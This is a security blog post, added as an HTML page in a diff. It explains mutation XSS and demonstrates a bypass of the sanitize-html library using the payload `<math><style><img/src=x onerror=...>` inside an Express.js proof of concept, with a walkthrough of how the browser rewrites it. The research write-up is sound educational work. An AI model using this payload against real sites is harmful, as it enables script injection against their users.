@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="en-AU">
+    <head>
+        <title>Xclow3n :)</title>
+        <meta charset="utf-8" />
+        <meta name="referrer" content="origin" />
+        <link rel="stylesheet" href="/assets/css/site.css" />
+        <link
+            rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/favicon-32x32.png"
+        />
+        <link
+            rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/favicon-16x16.png"
+        />
+        <link rel="stylesheet" href="/assets/css/prism.css" />
+        <script src="/assets/js/prism.js" defer></script>
+    </head>
+    <body>
+        <header>
+            <nav>
+                <center>
+                    <a href="/">
+                        <img
+                            src="/assets/images/1.gif"
+                            width="512"
+                            height="233"
+                            alt="logo"
+                        />
+                    </a>
+                </center>
+            </nav>
+        </header>
+        <main>
+            <fieldset>
+                <legend>
+                    <h4>HTML Sanitize Bypass Using MXSS</h4>
+                </legend>
+
+                <p>
+                    A couple of months ago, I was creating a CTF challenge but was missing a bug. To increase the difficulty of my challenge, I started looking for HTML sanitizer bypasses. During my research, I learned about Mutation XSS (MXSS), which can be used to bypass HTML sanitizers.
+                </p>
+
+                <h4>Quick Introduction to Mutation XSS</h4>
+                <br />
+                <p>
+                    When broken markup is rendered, instead of crashing or displaying an error message, browsers attempt to interpret and fix the HTML as best as they can, even if it contains minor syntax errors or missing elements. For instance, opening the following markup in the browser
+                </p>
+                <pre><code class="language-html">&lt;p&gt;test</code></pre>
+                <p>
+                    will execute as expected despite missing a closing `&lt;/p&gt;` tag. When looking at the final page’s HTML code, we can see that the parser fixed our broken markup and closed the `&lt;p&gt;` element by itself:
+                </p>
+                <pre><code class="language-html">&lt;p&gt;test&lt;/p&gt;</code></pre>
+
+                <br />
+                <h3>sanitize-html Bypass</h3>
+                <br />
+                <p>
+                    While reading the documentation of the "sanitize-html" library, I noticed that it's built on "htmlparser2," which does not strictly comply with HTML specifications.
+                </p>
+
+                <p>
+                    Continuing with the testing after trying a bunch of payloads, I managed to create the following Proof of Concept (POC):
+                </p>
+                <pre>
+                    <code class="language-javascript">
+const express = require("express");
+const bodyParser = require("body-parser");
+const sanitizeHtml = require("sanitize-html");
+
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: true }));
+
+app.get("/", (req, res) => {
+    const userInput = `&lt;math&gt;&lt;style&gt;&lt;img/src=x onerror="alert(1)"`;
+    const sanitizedInput = sanitizeHtml(userInput, {
+        allowedTags: sanitizeHtml.defaults.allowedTags.concat(["math", "style"]),
+    });
+
+    res.send(`
+    &lt;!DOCTYPE html&gt;
+    &lt;html lang="en"&gt;
+        &lt;head&gt;
+            &lt;meta charset="UTF-8"&gt;
+            &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+            &lt;title&gt;Sanitized Output&lt;/title&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+            &lt;h1&gt;Sanitized Output&lt;/h1&gt;
+            &lt;p&gt;${sanitizedInput}&lt;/p&gt;
+            &lt;a href="/"&gt;Back to form&lt;/a&gt;
+        &lt;/body&gt;
+    &lt;/html&gt;
+    `);
+});
+
+const PORT = process.env.PORT || 1337;
+app.listen(PORT, () => {
+    console.log(`Server is running on http://localhost:${PORT}`);
+});
+                    </code>
+                </pre>
+
+                <p>
+                    <br />
+                    Technically, I think the maintainers of the library are aware of this issue because if you allow the
+                    <code class="language-text">style</code> element in the allowed elements, you receive the following warning:
+                </p>
+
+                <pre>
+                    <code class="language-bash">
+Server is running on http://localhost:1337
+
+⚠️ Your `allowedTags` option includes `style`,
+which is inherently vulnerable to XSS attacks.
+Please remove it from `allowedTags`. Or, to
+disable this warning, add the `allowVulnerableTags`
+option and ensure you are accounting for this risk.
+                    </code>
+                </pre>
+
+                <p>
+                    <pre><code class="language-html">&lt;math&gt;&lt;style&gt;&lt;img/src=x onerror="alert(1)"</code></pre>
+                </p>
+
+                <p>
+                    This payload is not sanitized because htmlparser2 parses everything inside the
+                    <code class="language-text">style</code> element as raw text. However, when the browser tries to fix the broken HTML, it does so according to HTML5 standards, resulting in the following rendering:
+                </p>
+
+                <pre>
+    <code class="language-html">&lt;math&gt;&lt;/math&gt;
+    &lt;style&gt;&lt;/style&gt;
+    &lt;img src="x" onerror="alert(1)"&gt;
+    </code>
+                </pre>
+
+                <ul>
+                    <li>
+                        According to HTML standards, the <code class="language-text">&lt;style&gt;</code> element cannot be inside the <code class="language-text">&lt;math&gt;</code> element, so the <code class="language-text">&lt;math&gt;</code> element is closed before encountering the <code class="language-text">&lt;style&gt;</code> element.
+                    </li>
+                    <br>
+                    <li>
+                        The <code class="language-text">&lt;style&gt;</code> tag should only contain CSS, and the <code class="language-text">&lt;math&gt;</code> tag should contain MathML elements. Placing an <code class="language-text">&lt;img&gt;</code> tag inside a <code class="language-text">&lt;style&gt;</code> tag violates these rules, so browsers automatically close the <code class="language-text">&lt;style&gt;</code> tag before processing the <code class="language-text">&lt;img&gt;</code> tag.
+                    </li>
+                    <br>
+                    <li>
+                        That's how this bypass works. In htmlparser2, it does not validate the content of the <code class="language-text">&lt;style&gt;</code> element since it is treated as raw text.
+                    </li>
+                </ul>
+
+                <br>
+                <p>
+                    The latest version as for now v2.13.1 is still has this issue and I dont think it will be patched unless the library replaces htmlparser2. This issue is showcased in the University CTF 2024 Intergalactic Bounty web challenge. Thanks a lot for reading! :)
+                </p>
+            </fieldset>
+        </main>
+        <footer>&copy; 2024 Xclow3n</footer>
+    </body>
+</html>
